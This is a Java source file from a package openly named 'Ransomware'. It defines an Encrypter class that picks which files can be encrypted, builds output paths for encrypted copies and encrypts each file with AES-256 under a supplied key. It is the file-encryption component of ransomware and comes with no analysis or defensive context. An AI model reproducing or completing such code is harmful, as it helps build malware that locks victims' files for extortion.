package Ransomware;

import Ransomware.Crypter;
import Ransomware.AES_256;
import java.io.File;

public class Encrypter extends Crypter {

    public Encrypter(String ext,String key){
        super(ext, key);
    }
    public File getOutFile(File in){
        return new File(generatorFilePath.getEncryptedFilePath(in));
    }
    public void doJob(File in, File out, String key){AES_256.encrypt(in,out,key);}
    public boolean isCryptableFile(File file){
        return fileFilter.isAEncryptableFile(file);
    }
}
